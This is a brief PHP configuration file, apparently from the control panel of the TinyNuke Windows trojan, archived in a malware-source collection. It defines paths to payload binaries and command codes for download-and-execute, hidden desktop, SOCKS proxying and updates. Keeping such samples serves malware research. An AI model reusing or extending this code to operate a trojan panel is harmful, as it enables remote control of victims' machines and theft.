/*
  name      TinyNuke
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?php
//paths
$CONST_PRIVATE_FOLDER = 'private/';
$CONST_INJECTS_PATH   = $CONST_PRIVATE_FOLDER.'injects.json';
$CONST_X64_BIN_PATH   = $CONST_PRIVATE_FOLDER.'x64.bin';
$CONST_X86_BIN_PATH   = $CONST_PRIVATE_FOLDER.'x86.bin';
//commands
$CONST_COMMAND_DL_EXEC        = 0;
$CONST_COMMAND_HIDDEN_DESKTOP = 1;
$CONST_COMMAND_SOCKS          = 2;
$CONST_COMMAND_UPDATE         = 3;
//misc
$CONST_PAGE_LIMIT = 50;
?>